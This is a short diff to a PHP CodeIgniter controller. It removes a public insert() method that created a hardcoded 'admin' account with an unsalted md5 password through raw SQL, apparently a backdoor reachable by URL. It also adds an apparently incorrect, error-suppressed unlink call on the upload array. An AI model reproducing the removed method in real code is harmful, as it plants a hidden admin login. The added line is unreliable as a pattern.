@@ -123,6 +123,7 @@ class Pages extends CI_Controller {
             if ($this->upload->do_upload("file")) {
                 $out = array('result' => true);
             }
+            @unlink($_FILES['file']);
             /**
              * Image Configuration
              */
@@ -208,13 +209,7 @@ class Pages extends CI_Controller {
         exit;
     }
 
-    public function insert() {
-        $this->load->database();
-        $psw = md5("..xx..");
-        $q = 
-             "INSERT INTO 'admin' (user,pass) VALUES ('admin','".$psw."');";
-        $query = $this->db->query($q);
-    }
+
 
 }
 
